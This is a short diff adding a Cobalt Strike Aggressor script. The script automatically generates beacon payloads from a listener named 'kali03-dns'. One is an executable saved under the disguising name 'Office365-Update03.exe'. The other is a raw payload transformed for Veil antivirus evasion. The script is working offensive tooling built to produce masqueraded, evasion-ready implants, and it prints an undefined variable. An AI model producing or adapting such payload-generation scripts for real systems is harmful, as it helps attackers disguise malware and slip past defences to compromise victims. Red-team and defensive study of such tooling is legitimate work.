@@ -1,0 +1,14 @@
+on ready { 
+		$data = artifact_payload("kali03-dns", "exe", "x86");
+		$handle = openf(">/root/cobaltstrike/payloads/Office365-Update03.exe");
+		println($lhandle)
+		writeb($handle, $data);
+		closef($handle);
+}
+
+on ready { 
+		$data = artifact_payload("kali03-dns", "raw", "x86");
+		$handle = openf(">/root/cobaltstrike/payloads/veil-payload1.txt");
+		println($lhandle);
+		writeb($handle, transform($data, "veil"));
+}
